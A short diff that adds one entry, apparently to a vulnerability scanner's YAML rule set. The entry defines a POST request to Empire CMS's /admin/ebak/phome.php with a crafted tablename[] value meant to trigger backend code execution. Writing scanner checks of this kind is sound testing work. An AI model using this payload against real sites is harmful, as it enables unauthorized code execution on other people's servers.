@@ -1,0 +1,12 @@
+models:
+  - empire:
+    info: "帝国CMS后台代码执行"
+    cveid: ""
+    reference: ""
+    method: "POST"
+    status: true
+    url: "/admin/ebak/phome.php"
+    keys:
+      mydbname: ""
+      dbchar: ""
+      tablename[]: "$_BT_REGEXP[(|;|)]"
